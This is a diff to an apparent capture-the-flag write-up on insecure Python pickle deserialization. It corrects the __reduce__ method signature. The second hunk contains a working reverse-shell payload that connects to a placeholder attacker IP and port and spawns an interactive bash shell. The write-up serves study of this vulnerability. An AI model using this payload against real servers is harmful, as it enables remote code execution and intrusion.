@@ -16,7 +16,7 @@ When a tuple is returned, it must be between two and six items long. Optional it
 A Python function is a callable object. So, if the attacker defines a class like the one below, pickles its instance and send the pickled object to the server, this will execute the specified function with the parameters given in the tuple.
 ```python
 class RCE:
-    def __reduce__():
+    def __reduce__(self):
         return (function_name, (parameter_1,parameter_2,)) #if there is only 1 parameter: (parameter_1,)
 ```
 ## Exploring the challenge
@@ -55,7 +55,7 @@ The behaviour to be exploited is the insecure unpickling (or insecure deserializ
 host="IP_Address"
 port="PORT"
 class RCE:
-    def __reduce__():
+    def __reduce__(self):
         #define code here won't work
         return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
 ```
